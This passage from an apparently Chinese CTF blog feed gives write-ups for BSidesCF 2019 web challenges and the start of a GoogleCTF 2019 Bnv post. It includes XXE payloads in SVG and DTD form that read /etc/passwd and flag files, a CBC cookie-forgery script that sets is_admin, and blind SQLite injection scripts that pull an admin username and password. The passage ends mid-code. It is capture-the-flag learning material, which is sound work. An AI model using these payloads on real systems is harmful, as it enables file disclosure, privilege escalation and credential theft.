<span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>512px<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>190px<span class="token punctuation">"</span></span> <span class="token attr-name">viewBox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0 0 512 190<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xlink<span class="token punctuation">"</span></span> <span class="token attr-name">preserveAspectRatio</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xMidYMid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>g</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>15<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>red<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>g</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>上面的是我们的xxe的payload，下面是名为<code>m4xlmum.svg</code>的文件的内容。</p><p><strong>重点：不知道flag在哪里</strong><br>自己试了半天也没事出来，看看大师傅的知道了<code>flag.txt</code>文件在程序根目录下，就是<code>file:///proc/self/cwd/flag.txt</code>,</p><blockquote><p><font color="red" size="18">记录一下，当前进程的根目录即为`/proc/self/cwd/`</font></p></blockquote><p>最终payload<br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag.txt" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>512px<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>190px<span class="token punctuation">"</span></span> <span class="token attr-name">viewBox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0 0 512 190<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xlink<span class="token punctuation">"</span></span> <span class="token attr-name">preserveAspectRatio</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xMidYMid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>g</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>15<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>red<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>g</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/11/12/BSidesCF-2019/4.png" alt><br><code>flag&#123;8e70f488-9dec-4868-b088-f930c6743e61&#125;</code></p><h1 id="3-Mixer"><a href="#3-Mixer" class="headerlink" title="3.Mixer"></a>3.Mixer</h1><p><strong>标签:分段密码攻击，cookie伪造</strong></p><p><strong>这个是涉及密码学的题目，真有意思了</strong><br><img src="/2020/11/12/BSidesCF-2019/31.png" alt><br>这里要将自己的身份<code>is_admin</code>置为<code>1</code>，这里涉及到了CBC分组加密的知识，下面这个链接里面又讲<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544562.html">分组加密及对应的攻击方式</a></p><p>BP抓包，改一下<code>user</code>字段的cookie为下图所示，两次修改不同位置（可最先两个与最后两个）的数据可获得加密前的数据的格式为<br><img src="/2020/11/12/BSidesCF-2019/32.png" alt><br><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;first_name&quot;:&quot;admin&quot;,&quot;last_name&quot;:&quot;admin&quot;,&quot;is_admin&quot;:0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>我们要构造的cookie即为下面的内容<br><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;first_name&quot;:&quot;admin&quot;,&quot;last_name&quot;:&quot;admin&quot;,&quot;is_admin&quot;:1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><strong>伪造(攻击)过程</strong><br>根据分组加密原理，每十六个字符分为一组，如下所示<br><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;first_name&quot;:&quot;admin&quot;,&quot;last_name&quot;:&quot;admin&quot;,&quot;is_admin&quot;:0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>~我密码学太菜了，不深究了，等学完密码学说不定就懂了，网上的教程并不是很多~，以下面的方式可以伪造cookie<br><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;first_name&quot;:&quot;a1.00000000000000&quot;,&quot;last_name&quot;:&quot;1234&quot;,&quot;is_admin&quot;:0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后说这里的第二组的内容会再跑到第五组之前，好家伙~听不懂~，下面就是它实际上传送的数据内容<br><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;first_name&quot;:&quot;a1.00000000000000&quot;,&quot;last_name&quot;:&quot;1234&quot;,&quot;is_admin&quot;:1.000000000000000&#125;&#123;&quot;first_name&quot;:&quot;a1.00000000000000&quot;,&quot;last_name&quot;:&quot;1234&quot;,&quot;is_admin&quot;:1.000000000000000&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>~此处为不懂标记，有时间或者想起来了回来再看，大佬如果明白请联系我qq:2994016494，Orz~</p><blockquote><p>懂了这里，就是先构造成这样，然后将第二组的加密后的数据移到第五组的前面就能实现上面的攻击了。</p></blockquote><p>这里直接提交下面的内容<br><pre class="line-numbers language-none"><code class="language-none">a1.000000000000001234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>如下图<br><img src="/2020/11/12/BSidesCF-2019/33.png" alt><br>抓包拿到user的值为<br><pre class="line-numbers language-none"><code class="language-none">de616fbb47a27dddc36cf01d10f3788079df1e7bfafa2718bc8d379d0dcc041e7ab9f97cc5bd276660cfc35deb6aaf7e77fe3b6402e7765460c1f566502bdf25988b71dc608586fbcb2f528164dff98c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>用python3脚本伪造一下，就是将上面的第二组的加密后的数据放到第五组的前面，这里是将十六个字符加密即获得三十二个字符，记一下吧。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">cookie <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input the cookie:"</span><span class="token punctuation">)</span>new_cookie <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">+</span> cookie<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">+</span> cookie<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#cookie[:-32]为前面的字符串,cookie[-32:]为最后的32个字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------分割------------------天下--------------------"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>new_cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>获得的效果如下:<img src="/2020/11/12/BSidesCF-2019/34.png" alt><br>伪造后的cookie为<code>de616fbb47a27dddc36cf01d10f3788079df1e7bfafa2718bc8d379d0dcc041e7ab9f97cc5bd276660cfc35deb6aaf7e77fe3b6402e7765460c1f566502bdf2579df1e7bfafa2718bc8d379d0dcc041e988b71dc608586fbcb2f528164dff98c</code></p><p>改下user的cookie为上面的内容即可获得flag<br><img src="/2020/11/12/BSidesCF-2019/35.png" alt><br><code>flag&#123;8efec087-4d58-41ab-ab3b-fbaa307c5e9f&#125;</code></p><h1 id="4-Sequel"><a href="#4-Sequel" class="headerlink" title="4.Sequel"></a>4.Sequel</h1><p><strong>标签:sqlite注入</strong></p><p><a href="https://blog.csdn.net/a3320315/article/details/104334246">参考链接</a></p><p>似乎到目前为止还没有搞过sqlite的注入，下面顺便学习一下。</p><h2 id="爆破得用户名密码"><a href="#爆破得用户名密码" class="headerlink" title="爆破得用户名密码"></a>爆破得用户名密码</h2><p>无法注入可爆破<br><strong>用户名:guest，密码:guest</strong><br>登陆后是以下的页面<br><img src="/2020/11/12/BSidesCF-2019/41.png" alt><br>啥提示都没得，抓下包或者直接看下请求包里面的cookie的值，有个带<code>eyj</code>的<code>1337_AUTH=eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9</code><br>后面的内容base64解码后为<br><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>看到是我们的用户名与密码，然后尝试注入，首先用下面的payload<br><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;username&quot;:&quot;\&quot; OR 1 OR \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;eyJ1c2VybmFtZSI6IlwiIE9SIDEgT1IgXCIiLCJwYXNzd29yZCI6Imd1ZXN0In0&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>上面的sql语句成功回显内容<br>而如果将上面的1改为0，就不行了，会显示非法用户，根据这个，可以进行布尔盲注。<br>下面都是<code>python3</code>脚本，这里的表名用<code>EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \&quot;&#123;&#125;\&quot; limit 1)</code>注。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token keyword">import</span> sysout <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> letter <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> out <span class="token operator">+</span> letter        <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>    <span class="token comment">#过滤掉notes表</span><span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'r'</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>    <span class="token comment">#过滤掉reviews表</span><span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>    <span class="token comment">#过滤掉sqlite表</span>        payload <span class="token operator">=</span> <span class="token string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            tmp <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://61072f69-98c4-4f55-8b17-69dad567971b.node3.buuoj.cn/sequels'</span><span class="token punctuation">,</span>                         cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"1337_AUTH"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Movie"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            out <span class="token operator">=</span> tmp            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>因为不止有一个表，所以要来回试试，最后的结果就是有一个<code>userinfo</code>表<br><img src="/2020/11/12/BSidesCF-2019/40.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token keyword">import</span> sysout <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> letter <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> out <span class="token operator">+</span> letter        <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'g'</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>    <span class="token comment">#过滤掉guest用户名</span>        payload <span class="token operator">=</span> <span class="token string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT username FROM userinfo WHERE username LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            tmp <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://61072f69-98c4-4f55-8b17-69dad567971b.node3.buuoj.cn/sequels'</span><span class="token punctuation">,</span>                         cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"1337_AUTH"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Movie"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            out <span class="token operator">=</span> tmp            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的注入语句为<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXISTS</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> userinfo <span class="token keyword">WHERE</span> username <span class="token operator">LIKE</span> \"&#123;&#125;\" <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>注出的用户名为<code>sequeladmin</code>，</p><p>同样的将username改为password即可注出password<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token keyword">import</span> sysout <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> letter <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> out <span class="token operator">+</span> letter        <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'g'</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>    <span class="token comment">#过滤掉guest用户名</span>        payload <span class="token operator">=</span> <span class="token string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT password FROM userinfo WHERE password LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            tmp <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://61072f69-98c4-4f55-8b17-69dad567971b.node3.buuoj.cn/sequels'</span><span class="token punctuation">,</span>                         cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"1337_AUTH"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Movie"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            out <span class="token operator">=</span> tmp            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>用户名为<code>sequeladmin</code><br>密码为<code>f5ec3af19f0d3679e7d5a148f4Ac323d</code><br>登录后获得flag<br><img src="/2020/11/12/BSidesCF-2019/42.png" alt><br><code>flag&#123;4a286fd3-408f-4bd3-9d17-e663a1355ee5&#125;</code></p><p>~后面的不会了，爬了爬了，作业还有好多。~</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCTF2019-Quals-Bnv</title>
      <link href="2020/11/10/GoogleCTF2019-Quals-Bnv/"/>
      <url>2020/11/10/GoogleCTF2019-Quals-Bnv/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>总有一滩水，接受所有的污浊。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=558071673&auto=1&height=66"></iframe><h2 id="1-BlindXXE"><a href="#1-BlindXXE" class="headerlink" title="1.BlindXXE"></a>1.BlindXXE</h2><p><a href="http://yugod.xmutsec.com/index.php/2019/07/14/50.html">这里是wp</a></p><blockquote><p>这里他说，xxe的漏洞现在几乎已经不常见了~（或者是几乎已经不见了）~<br>之前也有做过一般的xxe的题目，那都是一把过，或者顶多是绕过一些限制而已，这种<code>blindxxe</code>还是第一次遇到，记录一下，以后可能会遇到！</p></blockquote><p><strong>dtd实体文件</strong><br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"hello"</span><span class="token punctuation">></span></span>  //内部普通实体    &lt;!ENTITY b SYSTEM "http://xml.org/hhh.dtd"> //外部普通实体    &lt;!ENTITY % para SYSTEM "file:///1234.dtd"> //外部参数实体    %para;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><blockquote><p>blindxxe需要用到的就是第三种<code>外部参数实体</code>，就是这个<code>&lt;!ENTITY % para SYSTEM &quot;file:///1234.dtd&quot;&gt;</code>，主要区别就是有个<code>%</code>作为分割了。</p><p>而且参数实体还能嵌套定义,但需要注意的是,内层的定义的参数实体 % 需要进行HTML转义,否则会出现解析错误</p><p></p><p><font color="red">就如下面一样:</font></p><br><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY % para &#39;&lt;!ENTITY &amp;#x25; files SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&#39;&gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p></p></blockquote><p>这里的<code>%</code>转义之后即为符号串<code>&amp;#x25</code>。</p><p><strong>Blind-XXE 引用本地DTD文件</strong></p><p>有可能我们访问不到外部服务器里面的dtd文件，这里就能用到ubuntu里面自带的dtd文件了<br>ubuntu系统自带<code>/usr/share/yelp/dtd/docbookx.dtd</code>文件<br>可用上面的第二种方法来重写外部参数实体，就像下面的代码一样<br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">    &lt;!ENTITY % ISOamso '        &lt;!ENTITY % file SYSTEM "file:///etc/passwd">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">eval</span> <span class="token attr-name">"&lt;!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">error</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">'test%file'</span><span class="token punctuation">></span></span>">        %eval;        %error;    '>    %local_dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后这里好像还不能用，因为没有进行html转义，对一部分字符进行html转义后得以下的payload~这里我直接换为<code>file:///flag</code>文件啦~<br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">    &lt;!ENTITY % ISOamso '        &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///flag">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">&amp;#x25;</span> <span class="token attr-name">eval</span> <span class="token attr-name">"&lt;!ENTITY</span> <span class="token attr-name">&amp;#x26;#x25;</span> <span class="token attr-name">error</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">&amp;#x27;test&amp;#x25;file&amp;#x27;</span><span class="token punctuation">></span></span>">        <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;        <span class="token entity" title="&#x25;">&amp;#x25;</span>error;    '>    %local_dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="2-记录"><a href="#2-记录" class="headerlink" title="2.记录"></a>2.记录</h2><p>首先查看源码，会看到有个<code>post.js</code>的文件，点击就能打开了，打开之后是下面的内容<br>在这个目录下<code>/static/post.js</code><br><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">/*Copyright 2019 Google LLCLicensed under the Apache License, Version 2.0 (the "License");you may not use this file except in compliance with the License.You may obtain a copy of the License at    https://www.apache.org/licenses/LICENSE-2.0Unless required by applicable law or agreed to in writing, softwaredistributed under the License is distributed on an "AS IS" BASIS,WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.See the License for the specific language governing permissions andlimitations under the License.*/</span><span class="token keyword">function</span> <span class="token function">AjaxFormPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> datasend<span class="token punctuation">;</span>  <span class="token keyword">var</span> message <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>  message <span class="token operator">=</span> message<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> blindvalues <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'10'</span><span class="token punctuation">,</span>    <span class="token string">'120'</span><span class="token punctuation">,</span>   <span class="token string">'140'</span><span class="token punctuation">,</span>    <span class="token string">'1450'</span><span class="token punctuation">,</span>   <span class="token string">'150'</span><span class="token 